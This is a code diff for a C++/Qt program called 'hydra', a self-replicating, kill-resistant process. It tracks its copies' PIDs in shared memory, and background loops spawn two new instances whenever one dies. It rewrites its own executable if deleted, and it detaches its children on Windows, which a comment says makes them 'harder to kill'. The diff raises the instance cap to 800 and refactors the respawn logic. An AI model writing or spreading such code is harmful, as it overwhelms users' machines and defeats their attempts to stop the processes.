@@ -35,7 +35,7 @@
 
 #define WIN_WIDTH 400
 #define WIN_HEIGHT 100
-#define MAX_NUM_PIDS 500
+#define MAX_NUM_PIDS 800
 #define BACKGROUND_HYDRAS 100
 #define SEGMENT_SZ (MAX_NUM_PIDS*8) // Each pid is int64_t
 #define MUSIC_TIME_MS_APPROX 375 
@@ -52,31 +52,20 @@ static void button_response() {
 }
 
 /* Print everything in our shared memory in hex */
+/*
 void print_segment_as_hex(QSharedMemory *s) {
-  //s->lock();
   unsigned char *data = (unsigned char*)s->data();
-  int i=0;
-  while (i < s->size()) {
+  for (int i=0; i<s->size(); i++)
     for (int j=0;j<32;j++) {
       //std::cout << std::setw(2) << std::hex << (int)data[i] << ' ';
-      i++;
     }
     //std::cout << std::endl;
   }
-  //s->unlock();
-}
+  //std::cout << "---" << std::endl;
+}*/
 
-/* Convenience function: Grab the uint_64 value in our shared memory at offset */
-int64_t get_shmem(int at, QSharedMemory *s) {
-  s->lock();
-  int64_t *shmem = (int64_t*)s->data();
-  int64_t thing = shmem[at];
-  s->unlock();
-  return thing;
-}
-
-/* Goes through the shared memory segment and adds the PID of this process to
- * the first available spot */
+/* Goes through the shared memory segment and inserts pid to
+ * the first cell that is either empty or has a dead process */
 void register_pid(QSharedMemory *s, int64_t pid) {
 
   int64_t *shmem = (int64_t*)s->data();
@@ -87,24 +76,20 @@ void register_pid(QSharedMemory *s, int64_t pid) {
       return;
     }
   }
-
-  print_segment_as_hex(s);
+  //print_segment_as_hex(s);
 }
 
+/* Spawn and register a single hydra */
 void spawn_and_register_one() {
 
-  // Since qprocess does not detach child on windows
   int64_t pid = os_exec_path(exe_file.fileName());
   //std::cout << "spawning pid " << pid << std::endl;
-
-  //qint64 pid;
-  //QProcess::startDetached(exe_file.fileName(), NO_ARGS, ".", &pid);
   register_pid(GLO_sharedmem, pid);
 
 }
 
-/* Self explanatory. Also, check to make sure the executable still exists.
- * If not, rewrite it and set the correct permissions. */
+/* Spawn and register two hydras. Also, check to make sure the executable still
+ * exists.  If not, rewrite it and set the correct permissions. */
 void spawn_two_more() {
 
   if (!exe_file.exists()) {
@@ -121,11 +106,9 @@ void spawn_two_more() {
   spawn_and_register_one();
 }
 
-void thread_verify_hydras(QSharedMemory *segment) {
-
-  // Continually monitor other Hydras, and respawn them if necessary.
-  // Normally, hydras respawn themselves, but if they were killed in a harsh way 
-  // (eg, SIGKILL) we respawn them here
+/* Continually check all PIDs stored in qsharedmem to see if they're alive. If a
+ * process is found dead, respawn two hydras to take its place */
+void check_hydras_loop(QSharedMemory *segment) {
 
   while (true) {
 
@@ -136,6 +119,7 @@ void thread_verify_hydras(QSharedMemory *segment) {
     //std::cout << "--- " << std::endl;
 
     for (int i=0;i<MAX_NUM_PIDS;i++) {
+
       if (shmem[i] == 0) // Out of range!
 	break;
 
@@ -146,6 +130,7 @@ void thread_verify_hydras(QSharedMemory *segment) {
         spawn_two_more();
         break;
       }
+
     }
     segment->unlock();
   }
@@ -159,52 +144,51 @@ void delete_music_after_pause() {
 }
 
 
-/* The index of this_pid in shmem */
-int find_in_shmem(QSharedMemory *segment, int64_t this_pid) {
+/* The index of pid in shmem, otherwise, return a really high number */
+unsigned int find_in_shmem(QSharedMemory *segment, int64_t pid) {
 
   segment->lock();
 
   int64_t *shmem = (int64_t*)segment->data();
 
   for (int i=0;i<MAX_NUM_PIDS;i++) {
-    if (shmem[i] == this_pid) {
+
+    if (shmem[i] == pid) {
       segment->unlock();
       return i;
     }
 
     if (shmem[i] == 0)
       break;
-
   }
 
   segment->unlock();
 
-  return BACKGROUND_HYDRAS+1;
+  return -1;
 
 }
 
-void reset_shared_mem(QSharedMemory *segment) {
-
+/* Zero out the shared memory segment */
+void reset_shmem(QSharedMemory *segment) {
   segment->lock();
   memset(segment->data(), 0, SEGMENT_SZ);
   segment->unlock();
-
 }
 
 int main(int argc, char* argv[])  {
 
   exe_file.setFileName(argv[0]);
+
   QSharedMemory segment("hydra :)");
   GLO_sharedmem = &segment;
   bool shmem_attached = segment.attach(QSharedMemory::ReadWrite);
 
   // First run! Our memory segment does not exist yet!
   if (!shmem_attached) {
-    std::cout << "Did not attach, resetting!" << std::endl;
+    //std::cout << "First hydra! Creating shared memory segment" << std::endl;
     segment.create(SEGMENT_SZ, QSharedMemory::ReadWrite);
     segment.attach(QSharedMemory::ReadWrite);
-    reset_shared_mem(&segment);
-
+    reset_shmem(&segment);
 
     for (int i=0;i<BACKGROUND_HYDRAS;i++) {
        segment.lock();
@@ -212,27 +196,27 @@ int main(int argc, char* argv[])  {
        segment.unlock();
     }
 
-    // our first GUI hydra
+    // Our first GUI hydra
     segment.lock();
     spawn_and_register_one();
     segment.unlock();
 
+    // On Windows, exiting the first process prevents creating a pr tree. All
+    // hydras we just spawned should be fully detached, making them harder to kill
     exit(0);
-    //thread_verify_hydras(&segment);
-
   }
 
-  // We are the background hydras
+  // Less than BACKGROUND_HYDRAS have spawned so far, so enter (infinite) checking loop 
   if (find_in_shmem(&segment, os_get_pid()) < BACKGROUND_HYDRAS) {
-    thread_verify_hydras(&segment);
+    check_hydras_loop(&segment);
   }
 
   // Setup signal callbacks
   os_trap_setup();
 
   // Have a new thread constantly check to see if daemon is alive
-  //std::thread t1(thread_verify_hydras, &segment);
-  //t1.detach();
+  // std::thread t1(check_hydras_loop, &segment);
+  // t1.detach();
 
   // Read in the executable file, in case they try to delete it
   exe_file.open(QIODevice::ReadOnly);
@@ -255,7 +239,7 @@ int main(int argc, char* argv[])  {
   music->play();
 
   // Delete this audio as soon as its done playing
-  std::thread t(delete_music_after_pause);
+  std::thread delete_music_thread(delete_music_after_pause);
 
   // Setup layouts
   QBoxLayout layout(QBoxLayout::TopToBottom);
@@ -300,7 +284,7 @@ int main(int argc, char* argv[])  {
   app.exec();
 
   // Make sure music is closed
-  t.join();
+  delete_music_thread.join();
 
   return 0;
 }
